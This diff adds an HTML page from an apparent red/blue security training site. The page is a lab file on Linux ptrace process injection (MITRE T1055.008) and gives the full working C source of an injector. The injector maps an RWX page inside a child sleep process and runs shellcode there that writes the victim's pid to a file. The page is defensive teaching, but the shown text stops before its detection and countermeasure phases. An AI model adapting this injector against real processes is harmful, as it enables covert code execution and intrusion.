@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<title>GH-003 The Borrowed Body (T1055.008): GHOSTLIGHT</title>
+<meta name="description" content="T1055.008 Ptrace System Calls, reproduced on Ubuntu 24.04: a 200-line injector makes a sleeping process run attacker code under its own pid, caught by the tracer relationship and a one-line memory-map diff. Every command verified.">
+<link rel="canonical" href="https://dillingerstaffing.github.io/ghostlight/ops/003-ptrace-injection/">
+<meta property="og:title" content="GH-003 The Borrowed Body (T1055.008): GHOSTLIGHT">
+<meta property="og:description" content="T1055.008 Ptrace System Calls, reproduced on Ubuntu 24.04: a 200-line injector makes a sleeping process run attacker code under its own pid, caught by the tracer relationship and a one-line memory-map diff. Every command verified.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dillingerstaffing.github.io/ghostlight/ops/003-ptrace-injection/">
+<meta property="og:site_name" content="GHOSTLIGHT">
+<meta property="og:image" content="https://dillingerstaffing.github.io/ghostlight/og-card.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="GH-003 The Borrowed Body (T1055.008): GHOSTLIGHT">
+<meta name="twitter:description" content="T1055.008 Ptrace System Calls, reproduced on Ubuntu 24.04: a 200-line injector makes a sleeping process run attacker code under its own pid, caught by the tracer relationship and a one-line memory-map diff. Every command verified.">
+<meta name="twitter:image" content="https://dillingerstaffing.github.io/ghostlight/og-card.png">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ccircle cx='16' cy='16' r='12.5' fill='none' stroke='%23e0642a' stroke-width='2.6'/%3E%3Crect x='14.6' y='5.5' width='2.8' height='21' fill='%23e0642a'/%3E%3C/svg%3E">
+
+<link rel="apple-touch-icon" href="../../assets/apple-touch-icon.png">
+<link rel="manifest" href="../../assets/manifest.webmanifest">
+<meta name="theme-color" content="#0a0c0f">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="GHOSTLIGHT">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Oswald:wght@500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/site.css?v=96166d67">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"TechArticle","headline":"GH-003 The Borrowed Body (T1055.008): GHOSTLIGHT",
+"url":"https://dillingerstaffing.github.io/ghostlight/ops/003-ptrace-injection/","description":"T1055.008 Ptrace System Calls, reproduced on Ubuntu 24.04: a 200-line injector makes a sleeping process run attacker code under its own pid, caught by the tracer relationship and a one-line memory-map diff. Every command verified.",
+"author":{"@type":"Person","name":"Chris Dillinger","url":"https://www.linkedin.com/in/christopherdillinger/"},
+"inLanguage":"en"}
+</script>
+</head>
+<body>
+
+<header class="site-header">
+  <a class="brand" href="../../index.html" aria-label="GHOSTLIGHT home">
+    <svg viewBox="0 0 32 32" aria-hidden="true"><circle cx="16" cy="16" r="12.5" fill="none" stroke="#e0642a" stroke-width="2.6"/><rect x="14.6" y="5.5" width="2.8" height="21" fill="#e0642a"/></svg>
+    <span class="brand-name">GHOSTLIGHT</span>
+  </a>
+  <nav class="site-nav">
+    <a href="../../method.html">METHOD</a>
+    <a href="../../index.html">FILES</a>
+  </nav>
+</header>
+
+<div class="onboard" data-onboard hidden>
+  <span><strong>How to read a file:</strong> every file follows the six-phase structure below. <span class="k-green">Green</span> is verified, <span class="k-red">red</span> is hostile.</span>
+  <button aria-label="Dismiss">GOT IT</button>
+</div>
+
+<div class="page" data-op="003">
+  <div class="wrap">
+    <section class="op-hero">
+      <div class="op-kicker">
+        <span class="case-no">GH-003</span>
+        <a class="tech-id" href="https://attack.mitre.org/techniques/T1055/008/" rel="noopener">T1055.008</a>
+        <span class="phase-tag red">PHASE RED INSIDE</span>
+      </div>
+      <h1>The Borrowed Body</h1>
+      <p class="lede">Your debugger does this every day. This file takes gdb's favorite trick, reaching into a running process and making it execute your code, and runs it by hand: a sleeping process wakes just long enough to betray its own pid, then goes back to sleep. Then we catch the intrusion two ways and lock the exact door it came through.</p>
+      <div class="op-meta-grid">
+        <div class="op-meta"><span class="mlabel">Technique</span><span class="mvalue">Process injection (ptrace)</span></div>
+        <div class="op-meta"><span class="mlabel">Target OS</span><span class="mvalue">Ubuntu 24.04.5 LTS</span></div>
+        <div class="op-meta"><span class="mlabel">Toolchain</span><span class="mvalue">gcc 13</span></div>
+        <div class="op-meta"><span class="mlabel">Level</span><span class="mvalue">Advanced</span></div>
+        <div class="op-meta"><span class="mlabel">Time</span><span class="mvalue">60 min</span></div>
+      </div>
+      <div class="objectives">
+        <h2>OBJECTIVES</h2>
+        <ol>
+          <li data-phase="phase-red"><span class="box"></span>Inject code into a live process with ptrace and prove it ran as the victim</li>
+          <li data-phase="phase-blue"><span class="box"></span>Detect the intrusion through the tracer relationship and the memory map</li>
+          <li data-phase="countermeasures"><span class="box"></span>Deny the ptrace syscall with seccomp and test the lock</li>
+          <li data-phase="debrief"><span class="box"></span>Take the IOC checklist and the one-sentence lesson</li>
+        </ol>
+      </div>
+    </section>
+
+    <div class="op-layout">
+      <nav class="rail" aria-label="Phases">
+        <span class="mlabel">Phases</span>
+        <ol>
+          <li><a href="#intel-brief"><span class="pnum">01</span>INTEL BRIEF<span class="tick"></span></a></li>
+          <li><a href="#target-environment"><span class="pnum">02</span>TARGET ENV<span class="tick"></span></a></li>
+          <li><a href="#phase-red"><span class="pnum">03</span>PHASE RED<span class="tick"></span></a></li>
+          <li><a href="#phase-blue"><span class="pnum">04</span>PHASE BLUE<span class="tick"></span></a></li>
+          <li><a href="#countermeasures"><span class="pnum">05</span>COUNTERMEASURES<span class="tick"></span></a></li>
+          <li><a href="#debrief"><span class="pnum">06</span>DEBRIEF<span class="tick"></span></a></li>
+        </ol>
+      </nav>
+
+      <div class="op-content">
+        <section class="phase" id="intel-brief">
+          <div class="phase-head"><span class="phase-num">01</span><h2>Intel Brief</h2><span class="phase-tag neutral">CONTEXT</span></div>
+          <p class="lede">MITRE ATT&amp;CK <a href="https://attack.mitre.org/techniques/T1055/008/" rel="noopener">T1055.008</a>: adversaries inject code into processes with the ptrace system call, the same kernel API debuggers use to inspect and control other processes. This file runs the debugger's machinery by hand, as the attack.</p>
+          <div class="prose">
+            <p><strong>Why this technique.</strong> ptrace is not a bug. It is the designed interface by which a debugger reads another process's memory, rewrites its registers, and single-steps its instructions. When gdb runs <strong>call malloc(64)</strong> inside your program, it performs exactly the sequence this file performs: hijack the registers, make the victim execute something, restore everything. The attack is legitimate machinery used with hostile intent, which is why it cannot be patched away. It can only be narrowed and watched.</p>
+            <p><strong>Why not the Windows version.</strong> The famous injection demos are Windows: CreateRemoteThread, reflective DLL injection. The idea ports directly; the machinery does not. Linux has no remote-thread API, so its native injection primitive is ptrace, with its own sub-technique ID. This file does the Linux-native version.</p>
+            <p><strong>Why the victim must be our child.</strong> Ubuntu's default Yama scope of 1 lets a process trace only its descendants; a stranger's attach fails with EPERM, verified in Phase Blue. So the injector spawns its own victim, exactly as real malware does: launch something benign-looking, then borrow its body. No protection was disabled for this lab.</p>
+            <p><strong>The concrete case, before the abstraction.</strong> <strong>./inject</strong> prints <em>victim's real pid is 17503 -&gt; MATCH. borrowed body confirmed.</em> The 8 bytes in /tmp/gh003_pwned decode to 17503, the pid of a sleeping process that never agreed to run anything. The memory-map diff shows one new line, an anonymous rwxp region that was not there before the attach. Same kernel, same process list, one borrowed body.</p>
+            <p><strong>Terms, earned.</strong> <strong>ptrace</strong> is the syscall family (PTRACE_ATTACH, PTRACE_GETREGS, PTRACE_SETREGS, PTRACE_SINGLESTEP, PTRACE_CONT, PTRACE_DETACH) for controlling another process. The <strong>tracer</strong> controls; the <strong>tracee</strong> is controlled. <strong>rip</strong> is the instruction pointer: where the victim executes next. A <strong>syscall gadget</strong> is two bytes, 0f 05, the syscall instruction, borrowed from the victim's own libc so the victim can be made to invoke any syscall. <strong>Remote mmap</strong> is making the victim call mmap on itself, so it allocates the hiding place with its own authority. <strong>Shellcode</strong> is position-independent machine code; ours is 104 bytes that call getpid and write the result to a file. <strong>process_vm_writev</strong> copies memory into another process. <strong>ERESTART_RESTARTBLOCK</strong> is the kernel cookie left in rax when a process is frozen mid-syscall; resume with it intact and the kernel restarts the syscall instead of running your code, which bit us in the lab and is explained in Phase Red. <strong>Yama</strong> is the kernel's ptrace-scope module; scope 1, the Ubuntu default, restricts tracing to descendants. <strong>seccomp-bpf</strong> is a per-process syscall filter, and the principled lock for this door.</p>
+          </div>
+          <div class="callout"><p><strong>Scope.</strong> T1055 has twelve sub-techniques, from DLL injection to VDSO hijacking. This file works one of them end to end, the ptrace one, because it is the Linux-native primitive and the richest teaching target. One implementation, one resolution, among many.</p></div>
+        </section>
+
+        <section class="phase" id="target-environment">
+          <div class="phase-head"><span class="phase-num">02</span><h2>Target Environment</h2><span class="phase-tag neutral">LOADOUT</span></div>
+          <p class="lede">Ubuntu 24.04.5 LTS with gcc 13, x86-64, in a disposable VM used only for this lab. The attack needs no privilege beyond spawning its own child. Run it on a throwaway box anyway: you are about to inject code into a live process on purpose.</p>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <h3>Build the lab</h3>
+              <div class="prose"><p>One C file for the attack: <strong>inject.c</strong>. The defender's tools are built in the sections that use them.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="gcc -O2 -o inject inject.c"><span data-label>COPY</span></button></div>
+                <pre>$ gcc -O2 -o inject inject.c</pre>
+              </div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <h3>The injector: inject.c</h3>
+              <div class="prose"><p>Read it as three parts. The <strong>shellcode block</strong> at the top is position-independent machine code assembled by gcc itself: open a file, getpid, write the pid, close, int3. <strong>find_syscall_gadget</strong> scans the victim's executable mappings through /proc/&lt;pid&gt;/mem for the two bytes 0f 05. <strong>main</strong> runs the seven moves: fork the victim, attach, remote-mmap a cave, copy in the shellcode, run it, verify the pid, restore and detach. The one line setting <strong>r.rax = -1</strong> before resuming is the whole difference between a working injector and a crash; Phase Red explains why.</p></div>
+<div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">c: inject.c</span><button class="copy-btn" data-copy="/* GH-003 lab: ptrace process injection (T1055.008), x86_64 Linux.&#10; * Spawns /bin/sleep as a child, attaches with ptrace, makes the child&#10; * mmap() a fresh RWX page via a remote syscall, writes position-&#10; * independent shellcode there, and runs it INSIDE the victim. The&#10; * shellcode calls getpid() and writes the pid to /tmp/gh003_pwned,&#10; * proving the code executed under the victim&#x27;s identity.&#10; * Safe lab: the victim is our own child, and we restore its registers. */&#10;#define _GNU_SOURCE&#10;#include &lt;stdio.h&gt;&#10;#include &lt;stdlib.h&gt;&#10;#include &lt;string.h&gt;&#10;#include &lt;unistd.h&gt;&#10;#include &lt;errno.h&gt;&#10;#include &lt;fcntl.h&gt;&#10;#include &lt;stdint.h&gt;&#10;#include &lt;sys/ptrace.h&gt;&#10;#include &lt;sys/wait.h&gt;&#10;#include &lt;sys/uio.h&gt;&#10;#include &lt;sys/user.h&gt;&#10;#include &lt;sys/mman.h&gt;&#10;&#10;/* ---- position-independent shellcode, assembled by gcc itself ---- */&#10;__asm__(&#10;&quot;.global sc_start, sc_end\n&quot;&#10;&quot;sc_start:\n&quot;&#10;&quot;  lea sc_path(%rip), %rdi\n&quot;   /* pathname */&#10;&quot;  mov $0x241, %esi\n&quot;          /* O_WRONLY|O_CREAT|O_TRUNC */&#10;&quot;  mov $0x1a4, %edx\n&quot;          /* 0644 */&#10;&quot;  mov $2, %eax\n&quot;              /* sys_open */&#10;&quot;  syscall\n&quot;&#10;&quot;  mov %rax, %r12\n&quot;            /* fd -&gt; r12 */&#10;&quot;  mov $39, %eax\n&quot;             /* sys_getpid */&#10;&quot;  syscall\n&quot;&#10;&quot;  mov %rax, sc_pidbuf(%rip)\n&quot; /* stash pid */&#10;&quot;  mov $1, %eax\n&quot;              /* sys_write */&#10;&quot;  mov %r12, %rdi\n&quot;&#10;&quot;  lea sc_pidbuf(%rip), %rsi\n&quot;&#10;&quot;  mov $8, %edx\n&quot;&#10;&quot;  syscall\n&quot;&#10;&quot;  mov $3, %eax\n&quot;              /* sys_close */&#10;&quot;  mov %r12, %rdi\n&quot;&#10;&quot;  syscall\n&quot;&#10;&quot;  int3\n&quot;                      /* stop: tracer sees SIGTRAP */&#10;&quot;sc_path: .asciz \&quot;/tmp/gh003_pwned\&quot;\n&quot;&#10;&quot;.align 8\n&quot;&#10;&quot;sc_pidbuf: .quad 0\n&quot;&#10;&quot;sc_end:\n&quot;&#10;);&#10;extern char sc_start, sc_end;&#10;&#10;static void die(const char *m) { perror(m); exit(1); }&#10;&#10;/* find a `syscall` (0f 05) gadget in the victim&#x27;s executable mappings */&#10;static uint64_t find_syscall_gadget(pid_t pid) {&#10;    char maps[64], mem[64];&#10;    snprintf(maps, sizeof maps, &quot;/proc/%d/maps&quot;, pid);&#10;    snprintf(mem, sizeof mem, &quot;/proc/%d/mem&quot;, pid);&#10;    FILE *f = fopen(maps, &quot;r&quot;);&#10;    if (!f) die(&quot;fopen maps&quot;);&#10;    int mfd = open(mem, O_RDONLY);&#10;    if (mfd &lt; 0) die(&quot;open mem&quot;);&#10;    char line[512];&#10;    uint64_t found = 0;&#10;    while (fgets(line, sizeof line, f)) {&#10;        uint64_t lo, hi;&#10;        char perms[8];&#10;        if (sscanf(line, &quot;%lx-%lx %7s&quot;, &amp;lo, &amp;hi, perms) != 3) continue;&#10;        if (perms[0] != &#x27;r&#x27; || perms[2] != &#x27;x&#x27;) continue;&#10;        size_t len = hi - lo;&#10;        uint8_t *buf = malloc(len);&#10;        if (!buf) die(&quot;malloc&quot;);&#10;        ssize_t n = pread(mfd, buf, len, lo);&#10;        for (ssize_t i = 0; i + 1 &lt; n &amp;&amp; !found; i++)&#10;            if (buf[i] == 0x0f &amp;&amp; buf[i + 1] == 0x05) found = lo + i;&#10;        free(buf);&#10;        if (found) break;&#10;    }&#10;    fclose(f);&#10;    close(mfd);&#10;    return found;&#10;}&#10;&#10;static void wait_stopped(pid_t pid, const char *what) {&#10;    int wst;&#10;    if (waitpid(pid, &amp;wst, 0) &lt; 0) die(&quot;waitpid&quot;);&#10;    if (!WIFSTOPPED(wst)) { fprintf(stderr, &quot;%s: not stopped (st=%x)\n&quot;, what, wst); exit(1); }&#10;}&#10;&#10;int main(int argc, char **argv) {&#10;    int pause_after = argc &gt; 1 &amp;&amp; strcmp(argv[1], &quot;--pause&quot;) == 0;&#10;    unlink(&quot;/tmp/gh003_pwned&quot;);&#10;    pid_t v = fork();&#10;    int st;&#10;    if (v == 0) { execl(&quot;/bin/sleep&quot;, &quot;sleep&quot;, &quot;600&quot;, NULL); die(&quot;execl&quot;); }&#10;    printf(&quot;[*] victim: sleep, pid %d (our child)\n&quot;, v);&#10;    sleep(1);&#10;&#10;    if (ptrace(PTRACE_ATTACH, v, 0, 0) &lt; 0) {&#10;        kill(v, SIGKILL);   /* do not orphan the victim on failure */&#10;        waitpid(v, &amp;st, 0);&#10;        die(&quot;PTRACE_ATTACH&quot;);&#10;    }&#10;    wait_stopped(v, &quot;attach&quot;);&#10;    printf(&quot;[*] attached. victim frozen mid-sleep.\n&quot;);&#10;    { /* blue-phase evidence: snapshot the victim&#x27;s memory map before... */&#10;        char cmd[128];&#10;        snprintf(cmd, sizeof cmd, &quot;cat /proc/%d/maps &gt; /tmp/gh003_maps_before&quot;, v);&#10;        if (system(cmd) != 0) die(&quot;maps before&quot;);&#10;    }&#10;&#10;    struct user_regs_struct orig, r;&#10;    if (ptrace(PTRACE_GETREGS, v, 0, &amp;orig) &lt; 0) die(&quot;GETREGS&quot;);&#10;&#10;    uint64_t gadget = find_syscall_gadget(v);&#10;    if (!gadget) { fprintf(stderr, &quot;no syscall gadget\n&quot;); return 1; }&#10;    printf(&quot;[*] syscall gadget at 0x%lx (borrowed from victim&#x27;s own libc)\n&quot;, gadget);&#10;&#10;    /* remote mmap(NULL, 8192, RWX, PRIVATE|ANON, -1, 0) */&#10;    r = orig;&#10;    r.rax = 9; r.rdi = 0; r.rsi = 8192; r.rdx = 7;&#10;    r.r10 = 0x22; r.r8 = -1; r.r9 = 0; r.rip = gadget;&#10;    if (ptrace(PTRACE_SETREGS, v, 0, &amp;r) &lt; 0) die(&quot;SETREGS mmap&quot;);&#10;    if (ptrace(PTRACE_SINGLESTEP, v, 0, 0) &lt; 0) die(&quot;SINGLESTEP&quot;);&#10;    wait_stopped(v, &quot;mmap&quot;);&#10;    if (ptrace(PTRACE_GETREGS, v, 0, &amp;r) &lt; 0) die(&quot;GETREGS mmap&quot;);&#10;    uint64_t cave = r.rax;&#10;    printf(&quot;[*] victim mmapped us a cave at 0x%lx\n&quot;, cave);&#10;&#10;    size_t sclen = (size_t)(&amp;sc_end - &amp;sc_start);&#10;    struct iovec local = { &amp;sc_start, sclen };&#10;    struct iovec remote = { (void *)cave, sclen };&#10;    if (process_vm_writev(v, &amp;local, 1, &amp;remote, 1, 0) != (ssize_t)sclen)&#10;        die(&quot;process_vm_writev&quot;);&#10;    printf(&quot;[*] wrote %zu bytes of shellcode into the victim\n&quot;, sclen);&#10;&#10;    r = orig; r.rip = cave;&#10;    r.rax = (unsigned long long)-1; /* attaching froze the victim inside nanosleep,&#10;        so orig.rax holds -ERESTART_RESTARTBLOCK. Resuming with that cookie in&#10;        rax makes the kernel hijack the resume to restart the syscall instead of&#10;        running our code. Any other value disarms it. */&#10;    if (ptrace(PTRACE_SETREGS, v, 0, &amp;r) &lt; 0) die(&quot;SETREGS run&quot;);&#10;    if (ptrace(PTRACE_CONT, v, 0, 0) &lt; 0) die(&quot;CONT&quot;);&#10;    waitpid(v, &amp;st, 0);&#10;    if (!WIFSTOPPED(st) || WSTOPSIG(st) != SIGTRAP) {&#10;        fprintf(stderr, &quot;expected SIGTRAP, got st=%x\n&quot;, st); return 1;&#10;    }&#10;    printf(&quot;[*] shellcode hit int3. it ran INSIDE the victim.\n&quot;);&#10;    { /* ...and after the injection, so the blue phase can diff them. */&#10;        char cmd[128];&#10;        snprintf(cmd, sizeof cmd, &quot;cat /proc/%d/maps &gt; /tmp/gh003_maps_after&quot;, v);&#10;        if (system(cmd) != 0) die(&quot;maps after&quot;);&#10;    }&#10;&#10;    int fd = open(&quot;/tmp/gh003_pwned&quot;, O_RDONLY);&#10;    if (fd &lt; 0) die(&quot;open pwned&quot;);&#10;    uint64_t pid_in_file = 0;&#10;    if (read(fd, &amp;pid_in_file, 8) != 8) die(&quot;read pwned&quot;);&#10;    close(fd);&#10;    printf(&quot;[*] /tmp/gh003_pwned says the code ran as pid %lu\n&quot;, (unsigned long)pid_in_file);&#10;    printf(&quot;[*] victim&#x27;s real pid is %d -&gt; %s\n&quot;, v,&#10;           pid_in_file == (uint64_t)v ? &quot;MATCH. borrowed body confirmed.&quot; : &quot;MISMATCH&quot;);&#10;&#10;    if (pause_after) {&#10;        printf(&quot;[*] PAUSED: victim %d holds the injected mapping. Inspect /proc/%d/maps, then press Enter.\n&quot;, v, v);&#10;        getchar();&#10;    }&#10;    if (ptrace(PTRACE_SETREGS, v, 0, &amp;orig) &lt; 0) die(&quot;restore&quot;);&#10;    if (ptrace(PTRACE_DETACH, v, 0, 0) &lt; 0) die(&quot;DETACH&quot;);&#10;    printf(&quot;[*] registers restored, detached. victim resumes its nap.\n&quot;);&#10;    kill(v, SIGKILL);&#10;    waitpid(v, &amp;st, 0);&#10;    return pid_in_file == (uint64_t)v ? 0 : 1;&#10;}&#10;"><span data-label>COPY</span></button></div>
+                <pre>/* GH-003 lab: ptrace process injection (T1055.008), x86_64 Linux.
+ * Spawns /bin/sleep as a child, attaches with ptrace, makes the child
+ * mmap() a fresh RWX page via a remote syscall, writes position-
+ * independent shellcode there, and runs it INSIDE the victim. The
+ * shellcode calls getpid() and writes the pid to /tmp/gh003_pwned,
+ * proving the code executed under the victim&#x27;s identity.
+ * Safe lab: the victim is our own child, and we restore its registers. */
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;sys/mman.h&gt;
+
+/* ---- position-independent shellcode, assembled by gcc itself ---- */
+__asm__(
+&quot;.global sc_start, sc_end\n&quot;
+&quot;sc_start:\n&quot;
+&quot;  lea sc_path(%rip), %rdi\n&quot;   /* pathname */
+&quot;  mov $0x241, %esi\n&quot;          /* O_WRONLY|O_CREAT|O_TRUNC */
+&quot;  mov $0x1a4, %edx\n&quot;          /* 0644 */
+&quot;  mov $2, %eax\n&quot;              /* sys_open */
+&quot;  syscall\n&quot;
+&quot;  mov %rax, %r12\n&quot;            /* fd -&gt; r12 */
+&quot;  mov $39, %eax\n&quot;             /* sys_getpid */
+&quot;  syscall\n&quot;
+&quot;  mov %rax, sc_pidbuf(%rip)\n&quot; /* stash pid */
+&quot;  mov $1, %eax\n&quot;              /* sys_write */
+&quot;  mov %r12, %rdi\n&quot;
+&quot;  lea sc_pidbuf(%rip), %rsi\n&quot;
+&quot;  mov $8, %edx\n&quot;
+&quot;  syscall\n&quot;
+&quot;  mov $3, %eax\n&quot;              /* sys_close */
+&quot;  mov %r12, %rdi\n&quot;
+&quot;  syscall\n&quot;
+&quot;  int3\n&quot;                      /* stop: tracer sees SIGTRAP */
+&quot;sc_path: .asciz \&quot;/tmp/gh003_pwned\&quot;\n&quot;
+&quot;.align 8\n&quot;
+&quot;sc_pidbuf: .quad 0\n&quot;
+&quot;sc_end:\n&quot;
+);
+extern char sc_start, sc_end;
+
+static void die(const char *m) { perror(m); exit(1); }
+
+/* find a `syscall` (0f 05) gadget in the victim&#x27;s executable mappings */
+static uint64_t find_syscall_gadget(pid_t pid) {
+    char maps[64], mem[64];
+    snprintf(maps, sizeof maps, &quot;/proc/%d/maps&quot;, pid);
+    snprintf(mem, sizeof mem, &quot;/proc/%d/mem&quot;, pid);
+    FILE *f = fopen(maps, &quot;r&quot;);
+    if (!f) die(&quot;fopen maps&quot;);
+    int mfd = open(mem, O_RDONLY);
+    if (mfd &lt; 0) die(&quot;open mem&quot;);
+    char line[512];
+    uint64_t found = 0;
+    while (fgets(line, sizeof line, f)) {
+        uint64_t lo, hi;
+        char perms[8];
+        if (sscanf(line, &quot;%lx-%lx %7s&quot;, &amp;lo, &amp;hi, perms) != 3) continue;
+        if (perms[0] != &#x27;r&#x27; || perms[2] != &#x27;x&#x27;) continue;
+        size_t len = hi - lo;
+        uint8_t *buf = malloc(len);
+        if (!buf) die(&quot;malloc&quot;);
+        ssize_t n = pread(mfd, buf, len, lo);
+        for (ssize_t i = 0; i + 1 &lt; n &amp;&amp; !found; i++)
+            if (buf[i] == 0x0f &amp;&amp; buf[i + 1] == 0x05) found = lo + i;
+        free(buf);
+        if (found) break;
+    }
+    fclose(f);
+    close(mfd);
+    return found;
+}
+
+static void wait_stopped(pid_t pid, const char *what) {
+    int wst;
+    if (waitpid(pid, &amp;wst, 0) &lt; 0) die(&quot;waitpid&quot;);
+    if (!WIFSTOPPED(wst)) { fprintf(stderr, &quot;%s: not stopped (st=%x)\n&quot;, what, wst); exit(1); }
+}
+
+int main(int argc, char **argv) {
+    int pause_after = argc &gt; 1 &amp;&amp; strcmp(argv[1], &quot;--pause&quot;) == 0;
+    unlink(&quot;/tmp/gh003_pwned&quot;);
+    pid_t v = fork();
+    int st;
+    if (v == 0) { execl(&quot;/bin/sleep&quot;, &quot;sleep&quot;, &quot;600&quot;, NULL); die(&quot;execl&quot;); }
+    printf(&quot;[*] victim: sleep, pid %d (our child)\n&quot;, v);
+    sleep(1);
+
+    if (ptrace(PTRACE_ATTACH, v, 0, 0) &lt; 0) {
+        kill(v, SIGKILL);   /* do not orphan the victim on failure */
+        waitpid(v, &amp;st, 0);
+        die(&quot;PTRACE_ATTACH&quot;);
+    }
+    wait_stopped(v, &quot;attach&quot;);
+    printf(&quot;[*] attached. victim frozen mid-sleep.\n&quot;);
+    { /* blue-phase evidence: snapshot the victim&#x27;s memory map before... */
+        char cmd[128];
+        snprintf(cmd, sizeof cmd, &quot;cat /proc/%d/maps &gt; /tmp/gh003_maps_before&quot;, v);
+        if (system(cmd) != 0) die(&quot;maps before&quot;);
+    }
+
+    struct user_regs_struct orig, r;
+    if (ptrace(PTRACE_GETREGS, v, 0, &amp;orig) &lt; 0) die(&quot;GETREGS&quot;);
+
+    uint64_t gadget = find_syscall_gadget(v);
+    if (!gadget) { fprintf(stderr, &quot;no syscall gadget\n&quot;); return 1; }
+    printf(&quot;[*] syscall gadget at 0x%lx (borrowed from victim&#x27;s own libc)\n&quot;, gadget);
+
+    /* remote mmap(NULL, 8192, RWX, PRIVATE|ANON, -1, 0) */
+    r = orig;
+    r.rax = 9; r.rdi = 0; r.rsi = 8192; r.rdx = 7;
+    r.r10 = 0x22; r.r8 = -1; r.r9 = 0; r.rip = gadget;
+    if (ptrace(PTRACE_SETREGS, v, 0, &amp;r) &lt; 0) die(&quot;SETREGS mmap&quot;);
+    if (ptrace(PTRACE_SINGLESTEP, v, 0, 0) &lt; 0) die(&quot;SINGLESTEP&quot;);
+    wait_stopped(v, &quot;mmap&quot;);
+    if (ptrace(PTRACE_GETREGS, v, 0, &amp;r) &lt; 0) die(&quot;GETREGS mmap&quot;);
+    uint64_t cave = r.rax;
+    printf(&quot;[*] victim mmapped us a cave at 0x%lx\n&quot;, cave);
+
+    size_t sclen = (size_t)(&amp;sc_end - &amp;sc_start);
+    struct iovec local = { &amp;sc_start, sclen };
+    struct iovec remote = { (void *)cave, sclen };
+    if (process_vm_writev(v, &amp;local, 1, &amp;remote, 1, 0) != (ssize_t)sclen)
+        die(&quot;process_vm_writev&quot;);
+    printf(&quot;[*] wrote %zu bytes of shellcode into the victim\n&quot;, sclen);
+
+    r = orig; r.rip = cave;
+    r.rax = (unsigned long long)-1; /* attaching froze the victim inside nanosleep,
+        so orig.rax holds -ERESTART_RESTARTBLOCK. Resuming with that cookie in
+        rax makes the kernel hijack the resume to restart the syscall instead of
+        running our code. Any other value disarms it. */
+    if (ptrace(PTRACE_SETREGS, v, 0, &amp;r) &lt; 0) die(&quot;SETREGS run&quot;);
+    if (ptrace(PTRACE_CONT, v, 0, 0) &lt; 0) die(&quot;CONT&quot;);
+    waitpid(v, &amp;st, 0);
+    if (!WIFSTOPPED(st) || WSTOPSIG(st) != SIGTRAP) {
+        fprintf(stderr, &quot;expected SIGTRAP, got st=%x\n&quot;, st); return 1;
+    }
+    printf(&quot;[*] shellcode hit int3. it ran INSIDE the victim.\n&quot;);
+    { /* ...and after the injection, so the blue phase can diff them. */
+        char cmd[128];
+        snprintf(cmd, sizeof cmd, &quot;cat /proc/%d/maps &gt; /tmp/gh003_maps_after&quot;, v);
+        if (system(cmd) != 0) die(&quot;maps after&quot;);
+    }
+
+    int fd = open(&quot;/tmp/gh003_pwned&quot;, O_RDONLY);
+    if (fd &lt; 0) die(&quot;open pwned&quot;);
+    uint64_t pid_in_file = 0;
+    if (read(fd, &amp;pid_in_file, 8) != 8) die(&quot;read pwned&quot;);
+    close(fd);
+    printf(&quot;[*] /tmp/gh003_pwned says the code ran as pid %lu\n&quot;, (unsigned long)pid_in_file);
+    printf(&quot;[*] victim&#x27;s real pid is %d -&gt; %s\n&quot;, v,
+           pid_in_file == (uint64_t)v ? &quot;MATCH. borrowed body confirmed.&quot; : &quot;MISMATCH&quot;);
+
+    if (pause_after) {
+        printf(&quot;[*] PAUSED: victim %d holds the injected mapping. Inspect /proc/%d/maps, then press Enter.\n&quot;, v, v);
+        getchar();
+    }
+    if (ptrace(PTRACE_SETREGS, v, 0, &amp;orig) &lt; 0) die(&quot;restore&quot;);
+    if (ptrace(PTRACE_DETACH, v, 0, 0) &lt; 0) die(&quot;DETACH&quot;);
+    printf(&quot;[*] registers restored, detached. victim resumes its nap.\n&quot;);
+    kill(v, SIGKILL);
+    waitpid(v, &amp;st, 0);
+    return pid_in_file == (uint64_t)v ? 0 : 1;
+}
+</pre>
+              </div>
+              <div class="prose"><p>Note the hygiene: the maps snapshots exist so Phase Blue can diff them, the <strong>--pause</strong> flag freezes the victim mid-intrusion for inspection, and the attach-failure path kills the forked victim instead of orphaning it. A lab that leaves sleepers behind is a lab that lies about cleanup.</p></div>
+            </div>
+          </div>
+          </section>
+
+        <section class="phase" id="phase-red">
+          <div class="phase-head"><span class="phase-num">03</span><h2>Phase Red: borrow the body</h2><span class="phase-tag red">ATTACK</span></div>
+          <p class="lede">The attack has seven moves: spawn the victim, freeze it, borrow a syscall instruction from its own libc, make it allocate a hiding place, copy in the shellcode, run it, and vanish. Watch the full sequence, then reproduce it.</p>
+          <figure class="recording reveal">
+            <div class="recording-bar">
+              <span class="rec-dot" aria-hidden="true"></span>
+              <span class="mlabel">Real screen recording</span>
+              <span class="dur">20.6s</span>
+            </div>
